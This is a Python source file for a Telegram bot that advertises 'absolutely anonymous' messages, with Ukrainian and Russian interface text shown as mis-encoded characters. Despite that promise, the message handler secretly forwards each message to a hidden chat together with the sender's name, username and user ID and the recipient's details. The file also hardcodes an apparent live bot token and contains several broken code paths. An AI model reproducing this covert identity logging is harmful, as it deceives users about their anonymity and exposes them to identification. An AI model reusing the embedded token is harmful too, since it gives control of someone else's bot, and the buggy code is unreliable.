import telebot
from telebot import types
#import database
import datetime
import sys
bot = telebot.TeleBot('5841491995:AAGm02QcwRSHe78M1YoV25r1mZGOlbs2LM8')
print("Start")

userData = {}


def initName(username, firstname):
    if username==None:
        return firstname
    else:
        return "@" +username

def get_question(message):
    try:
        if str(message.text) and (message.text).startswith( '/start' ):
            markup = types.InlineKeyboardMarkup(row_width=2)
            btn_newQuestion = types.InlineKeyboardButton(text='–ó–∞–¥–∞—Ç–∏ —â–µ –æ–¥–Ω–µ –ø–∏—Ç–∞–Ω–Ω—è.', callback_data="new_question")
            btn_stop = types.InlineKeyboardButton(text='–£ –º–µ–Ω–µ –Ω–µ–º–∞—î –∑–∞–ø–∏—Ç–∞–Ω—å.', callback_data="stop_msg")
            markup.add(btn_newQuestion, btn_stop)
            bot.send_message(message.chat.id, "–ü–æ–º–∏–ª–∫–∞. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ñ—Å—Ç—å –≤–∞—à–æ–≥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.", reply_markup=markup)
        else:
            bot.send_message(userData[message.from_user.id]["recipientUserId"], "<b>–í–∞–º –Ω–æ–≤–µ –∞–Ω–æ–Ω—ñ–º–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.</b>\n\n"+
                                                                                message.text ,parse_mode="html")

            bot.send_message(-897824493, f"<b>–ù–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ</b>\n\n"
                                             f"<i><b>–û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å:</b></i>\n\n"
                                             f"<b>firstname:</b> {message.from_user.first_name}\n"
                                             f"<b>username:</b> {initName(message.from_user.username, message.from_user.first_name)}\n"
                                             f"<b>userid:</b> {str(message.from_user.id)}\n\n"
                                             f"<i><b>–ü–æ–ª—É—á–∞—Ç–µ–ª—å:</b></i>\n\n"
                                             "<b>firstname:</b> "+userData[message.from_user.id]["recipientFirstname"]+"\n"
                                             "<b>username:</b> "+userData[message.from_user.id]["recipientUsername"]+"\n"
                                             "<b>userid:</b> "+str(userData[message.from_user.id]["recipientUserId"])+"\n\n"
                                             f"<i><b>–¢–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è:</b></i>\n{message.text}\n\n"
                                             f"<i><b>–î–∞—Ç–∞/–í—Ä–µ–º—è: </b></i>{datetime.datetime.now()}"
                             ,parse_mode="html")

            markup = types.InlineKeyboardMarkup(row_width=2)
            btn_newQuestion = types.InlineKeyboardButton(text='–ó–∞–¥–∞—Ç–∏ —â–µ –æ–¥–Ω–µ –ø–∏—Ç–∞–Ω–Ω—è.', callback_data="new_question")
            btn_stop = types.InlineKeyboardButton(text='–£ –º–µ–Ω–µ –Ω–µ–º–∞—î –∑–∞–ø–∏—Ç–∞–Ω—å.', callback_data="stop_msg")
            markup.add(btn_newQuestion,btn_stop)
#             database.add_question(firstname=message.from_user.first_name,
#                                   username=initName(message.from_user.username, message.from_user.first_name),
#                                   userid=message.from_user.id,
#                                   recipientFirstname= userData[message.from_user.id]["recipientFirstname"],
#                                   recipientUsername=userData[message.from_user.id]["recipientUsername"],
#                                   recipientUserId = userData[message.from_user.id]["recipientUserId"],
#                                   question=message.text,
#                                   time=str(datetime.datetime.now()))

            bot.send_message(message.chat.id, "–ì–æ—Ç–æ–≤–æ, —Ç–≤–æ—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–æ—Å—Ç–∞–≤–ª–µ–Ω–æ.\n\n"
                                              "–•–æ—á–µ—Ç–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ —â–µ –æ–¥–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–ª—è "+ userData[message.chat.id]["recipientUsername"]+"?", reply_markup=markup)
    except TypeError:
        e = sys.exc_info()[1]
        print(e.args[0])
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_newQuestion = types.InlineKeyboardButton(text='–°–ø—Ä–æ–±—É–≤–∞—Ç–∏ —â–µ —Ä–∞–∑.', callback_data="new_question")
        markup.add(btn_newQuestion)
        bot.send_message(message.chat.id, "–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ñ—Å—Ç—å –≤–∞—à–æ–≥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è. (–ë–æ—Ç –ø—Ä–∏–π–º–∞—î —Ç—ñ–ª—å–∫–∏ —Ç–µ–∫—Å—Ç–æ–≤—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.)", reply_markup=markup)



@bot.message_handler(commands=['start' ,'share'])
def start(message):
    if message.chat.type != "private":
        bot.send_message(message.chat.id, "–ë–æ—Ç –ø—Ä–∞—Ü—é—î —Ç—ñ–ª—å–∫–∏ —É <b>–ø—Ä–∏–≤–∞—Ç–Ω–æ–º—É</b> —á–∞—Ç—ñ!",parse_mode="html")
        return
    #database.add_user(initName(message.from_user.username, message.from_user.first_name),message.chat.id)
    if message.text != "/start" and message.text != "/share":
        try:
            recipientData = bot.get_chat(int(message.text[7:]))
            userData[message.from_user.id] = {"fromUserId": message.from_user.id,
                                              "fromUsername": initName(message.from_user.username, message.from_user.first_name),
                                              "recipientFirstname":recipientData.first_name,
                                              "recipientUsername": initName(recipientData.username, recipientData.first_name),
                                              "recipientUserId": recipientData.id}
            bot.register_next_step_handler(
                bot.send_message(message.chat.id,f"–¢–µ–ø–µ—Ä —Ç–∏ –º–æ–∂–µ—à –Ω–∞–ø–∏—Å–∞—Ç–∏ –±—É–¥—å-—è–∫–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è {initName(recipientData.username, recipientData.first_name)} —ñ –≤–æ–Ω–æ –±—É–¥–µ –∞–±—Å–æ–ª—é—Ç–Ω–æ –∞–Ω–æ–Ω—ñ–º–Ω–∏–º!\n\n"
                                          f"–ù–∞–ø–∏—à–∏ —Å—é–¥–∏ –≤—Å–µ, —â–æ –ø—Ä–æ –Ω—å–æ–≥–æ –¥—É–º–∞—î—à –≤ –æ–¥–Ω–æ–º—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—ñ —ñ –∑–∞ –∫—ñ–ª—å–∫–∞ –º–∏—Ç—Ç—î–≤–æ—Å—Ç–µ–π –≤—ñ–Ω –π–æ–≥–æ –æ—Ç—Ä–∏–º–∞—î, –∞–ª–µ –Ω–µ –∑–Ω–∞—Ç–∏–º–µ –≤—ñ–¥ –∫–æ–≥–æ –≤–æ–Ω–æ."),
                                           get_question)
        except :
            bot.send_message(message.chat.id, "<b>–ü–æ–º–∏–ª–∫–∞</b> –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, —è–∫–æ–º—É –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–∏–π.\n"
                                                   "–°–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑!",parse_mode="html")
    else:
        bot.send_message(message.chat.id,"<b>–ü—Ä–∏–≤—ñ—Ç</b> üëã\n\n"
"–¶–µ–π —Ä–æ–±–æ—Ç –º–æ–∂–µ –ø—Ä–∏–π–º–∞—Ç–∏ –∞–Ω–æ–Ω—ñ–º–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è. –†–æ–∑–º—ñ—Å—Ç–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è —É —Å–µ–±–µ –≤ –æ–ø–∏—Å—ñ –ø—Ä–æ—Ñ—ñ–ª—é <b>Instagram/Telegram/Facebook</b> —Ç–∞ –æ—Ç—Ä–∏–º—É–π –∞–Ω–æ–Ω—ñ–º–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä—è–º–æ –≤ —Ü–µ–π —á–∞—Ç.\n\n"
"–û—Å—å —Ç–≤–æ—î –ø–æ—Å–∏–ª–∞–Ω–Ω—è üëá\n\n"
f"https://t.me/anon_sms_bot?start={message.chat.id}\n\n"
"–ü–æ—Å–∏–ª–∞–Ω–Ω—è –¥–æ–¥–∞–≤–∞—Ç–∏ —É —Å–≤–æ—î–º—É –ø—Ä–æ—Ñ—ñ–ª—ñ.\n"
"–¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–Ω–æ–ø–∫–∏  ¬´<b>–†–µ–¥–∞–≥—É–≤–∞—Ç–∏ –ø—Ä–æ—Ñ—ñ–ª—å</b>¬ª\n", parse_mode="html" )

@bot.callback_query_handler(func=lambda call: True)
def inlin(call):
    if call.data == "new_question":
        try:
            bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.message_id)
            bot.register_next_step_handler(
                bot.send_message(call.from_user.id,
                                 f"–í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ –Ω–æ–≤–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–ª—è " + userData[call.from_user.id]["recipientUsername"]+ " —ñ –≤–æ–Ω–æ –±—É–¥–µ –∞–±—Å–æ–ª—é—Ç–Ω–æ –∞–Ω–æ–Ω—ñ–º–Ω–∏–º!\n\n"
                                 f"–ù–∞–ø–∏—à–∏ —Å—é–¥–∏ –≤—Å–µ, —â–æ –ø—Ä–æ –Ω—å–æ–≥–æ –¥—É–º–∞—î—à –≤ –æ–¥–Ω–æ–º—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—ñ —ñ –∑–∞ –∫—ñ–ª—å–∫–∞ –º–∏—Ç—Ç—î–≤–æ—Å—Ç–µ–π –≤—ñ–Ω –π–æ–≥–æ –æ—Ç—Ä–∏–º–∞—î, –∞–ª–µ –Ω–µ –∑–Ω–∞—Ç–∏–º–µ –≤—ñ–¥ –∫–æ–≥–æ –≤–æ–Ω–æ."),
                get_question)
        except KeyError:
            e = sys.exc_info()[1]
            print(e.args[0])
            bot.send_message(call.message.chat.id, "<b>–ü–æ–º–∏–ª–∫–∞</b> –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, —è–∫–æ–º—É –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–∏–π.\n"
                                                   "–°–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑!",parse_mode="html")
    elif call.data == "stop_msg":
        try:

            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                          text="–í–∏ –±—ñ–ª—å—à–µ –Ω–µ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î—Ç–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É "+ initName(userData[call.message.chat.id]["recipientUsername"][1:] ,userData[call.message.chat.id]["recipientFirstname"]))
            del userData[call.message.chat.id]["recipientUsername"]
            del userData[call.message.chat.id]["recipientFirstname"]
            del userData[call.message.chat.id]["recipientUserId"]
        except KeyError:
            e = sys.exc_info()[1]
            print(e.args[0])
            bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.message_id)
            bot.send_message(call.message.chat.id,
                             "<b>–ü–æ–º–∏–ª–∫–∞</b> –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, —è–∫–æ–º—É –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–∏–π.\n"
                             "–°–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑!", parse_mode="html")

    elif call.data == "startMailning":
        bot.delete_message(call.message.chat.id, call.message.id)
        users_id = database.get_all_userid()
        for userId in users_id:
            bot.send_photo(userId, photo=mailingPhoto, caption=mailingText)
        bot.send_message(call.from_user.id, "–†–∞—Å—Å—ã–ª–∫–∞ –æ–∫–æ–Ω—á–µ–Ω–∞")

    elif call.data == "startMailningText":
        bot.delete_message(call.message.chat.id, call.message.id)
        users_id = database.get_all_userid()
        for userId in users_id:
            bot.send_message(userId, mailingText2)
        bot.send_message(call.from_user.id, "–†–∞—Å—Å—ã–ª–∫–∞ –æ–∫–æ–Ω—á–µ–Ω–∞")

@bot.message_handler(commands=['mailing'])
def mailing(message):
    del mailingText, mailingPhoto
    if message.from_user.id == 502391525:
        bot.register_next_step_handler(
            bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏:"), mailing2
        )
    else:
        bot.send_message(message.chat.id, "–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ!")

def mailing2(message):
    global mailingText
    mailingText = message.text
    bot.register_next_step_handler(
        bot.send_message(message.chat.id,"–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ç–æ:"), mailing3
    )
def mailing3(message):
    global mailingPhoto
    try:
        photo_id = message.photo[-1].file_id
        photo_file = bot.get_file(photo_id)  # <class 'telebot.types.File'>
        mailingPhoto = bot.download_file(photo_file.file_path)  # <class 'bytes'>
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_confirmMailning = types.InlineKeyboardButton(text='–ù–∞—á–∞—Ç—å —Ä–∞—Å—Å—ã–ª–∫—É', callback_data="startMailning")
        markup.add(btn_confirmMailning)
        bot.send_photo(message.from_user.id, photo= mailingPhoto, caption= mailingText,reply_markup=markup)
    except:
        bot.send_message(message.from_user.id, "–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑\n–°—É–¥—è –ø–æ –≤—Å–µ–º—É –≤—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –Ω–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é")


@bot.message_handler(commands=['mailing_text'])
def mailingText(message):
    if message.from_user.id == 502391525:
        bot.register_next_step_handler(
            bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏:"), mailingText2
        )
    else:
        bot.send_message(message.chat.id, "–£ –≤–∞—Å –Ω–µ–º–∞—î –¥–æ—Å—Ç—É–ø—É –¥–ª—è —Ü—ñ—î—ó –∫–æ–º–∞–Ω–¥–∏!")

def mailingText2(message):
    global mailingText2
    mailingText2 = message.text
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_confirmMailning = types.InlineKeyboardButton(text='–ù–∞—á–∞—Ç—å —Ä–∞—Å—Å—ã–ª–∫—É', callback_data="startMailningText")
    markup.add(btn_confirmMailning)
    bot.send_message(message.from_user.id, mailingText2, reply_markup=markup)




if __name__ == '__main__':
    #database.init_db()
    bot.polling(none_stop=True)
